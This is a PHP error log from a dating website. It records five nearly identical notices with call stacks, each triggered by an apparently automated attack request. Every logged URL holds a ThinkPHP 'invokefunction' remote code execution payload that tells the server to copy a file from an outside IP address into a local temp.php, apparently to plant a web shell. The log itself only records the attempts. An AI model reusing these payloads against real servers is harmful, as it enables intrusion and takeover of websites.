2025-06-26 10:23:33
User_id: 0
Error: E_NOTICE
URL: https://meetgreeksingles.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://114.67.178.171:8080/2.txt&vars%5B1%5D%5B%5D=temp.php
File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/lib/lib.php
Line: 695
Message: Array to string conversion

Call stack:

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/current/common.class.php (Line: 3081)
Function: del_param

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/current/cheader.class.php (Line: 1523)
Class: Common
Function: parseDropDownListLanguage

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/lib/block.php (Line: 294)
Class: CHeader
Function: parseBlock

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/lib/block.php (Line: 277)
Class: CHtmlBlock
Function: parse

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/core/main_close.php (Line: 1)
Class: CHtmlBlock
Function: parse

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/index.php (Line: 669)
Function: include

---------

2025-06-26 10:23:36
User_id: 0
Error: E_NOTICE
URL: https://meetgreeksingles.com/?s=/Home/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://114.67.178.171:8080/2.txt&vars%5B1%5D%5B%5D=temp.php
File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/lib/lib.php
Line: 695
Message: Array to string conversion

Call stack:

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/current/common.class.php (Line: 3081)
Function: del_param

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/current/cheader.class.php (Line: 1523)
Class: Common
Function: parseDropDownListLanguage

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/lib/block.php (Line: 294)
Class: CHeader
Function: parseBlock

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/lib/block.php (Line: 277)
Class: CHtmlBlock
Function: parse

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/core/main_close.php (Line: 1)
Class: CHtmlBlock
Function: parse

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/index.php (Line: 669)
Function: include

---------

2025-06-26 10:35:47
User_id: 0
Error: E_NOTICE
URL: https://meetgreeksingles.com/?s=/admin/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://114.67.178.171:8080/2.txt&vars%5B1%5D%5B%5D=temp.php
File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/lib/lib.php
Line: 695
Message: Array to string conversion

Call stack:

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/current/common.class.php (Line: 3081)
Function: del_param

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/current/cheader.class.php (Line: 1523)
Class: Common
Function: parseDropDownListLanguage

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/lib/block.php (Line: 294)
Class: CHeader
Function: parseBlock

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/lib/block.php (Line: 277)
Class: CHtmlBlock
Function: parse

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/core/main_close.php (Line: 1)
Class: CHtmlBlock
Function: parse

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/index.php (Line: 669)
Function: include

---------

2025-06-26 12:13:10
User_id: 0
Error: E_NOTICE
URL: https://meetgreeksingles.com/?s=/Home/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://114.67.178.171:8080/2.txt&vars%5B1%5D%5B%5D=temp.php
File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/lib/lib.php
Line: 695
Message: Array to string conversion

Call stack:

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/current/common.class.php (Line: 3081)
Function: del_param

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/current/cheader.class.php (Line: 1523)
Class: Common
Function: parseDropDownListLanguage

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/lib/block.php (Line: 294)
Class: CHeader
Function: parseBlock

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/lib/block.php (Line: 277)
Class: CHtmlBlock
Function: parse

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/core/main_close.php (Line: 1)
Class: CHtmlBlock
Function: parse

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/index.php (Line: 669)
Function: include

---------

2025-06-26 12:13:11
User_id: 0
Error: E_NOTICE
URL: https://meetgreeksingles.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://114.67.178.171:8080/2.txt&vars%5B1%5D%5B%5D=temp.php
File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/lib/lib.php
Line: 695
Message: Array to string conversion

Call stack:

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/current/common.class.php (Line: 3081)
Function: del_param

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/current/cheader.class.php (Line: 1523)
Class: Common
Function: parseDropDownListLanguage

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/lib/block.php (Line: 294)
Class: CHeader
Function: parseBlock

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/lib/block.php (Line: 277)
Class: CHtmlBlock
Function: parse

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/_include/core/main_close.php (Line: 1)
Class: CHtmlBlock
Function: parse

File: /home/slqihj5q4r69/public_html/meetgreeksingles.com/index.php (Line: 669)
Function: include

---------

